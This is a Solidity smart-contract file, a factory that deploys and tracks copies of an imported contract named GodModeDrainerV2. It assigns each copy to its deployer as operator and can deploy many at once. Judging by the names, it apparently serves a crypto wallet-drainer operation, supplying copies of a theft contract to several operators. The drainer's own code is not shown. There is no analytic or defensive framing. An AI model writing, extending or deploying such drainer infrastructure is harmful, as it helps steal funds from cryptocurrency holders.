// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "./GodModeDrainerV2.sol";

contract GodModFactory {
    address public owner;
    address[] public deployedDrainers;
    mapping(address => address) public drainerOwner;
    
    event DrainerDeployed(address indexed owner, address drainer);
    
    constructor() {
        owner = msg.sender;
    }
    
    function deployDrainer() public returns (address) {
        GodModeDrainerV2 drainer = new GodModeDrainerV2();
        deployedDrainers.push(address(drainer));
        drainerOwner[address(drainer)] = msg.sender;
        
        // Transfer ownership to deployer
        GodModeDrainerV2(payable(address(drainer))).addOperator(msg.sender);
        
        emit DrainerDeployed(msg.sender, address(drainer));
        return address(drainer);
    }
    
    function deployMultiple(uint256 count) external returns (address[] memory) {
        address[] memory drainers = new address[](count);
        for (uint i = 0; i < count; i++) {
            drainers[i] = deployDrainer();
        }
        return drainers;
    }
    
    function getDeployedCount() external view returns (uint256) {
        return deployedDrainers.length;
    }
}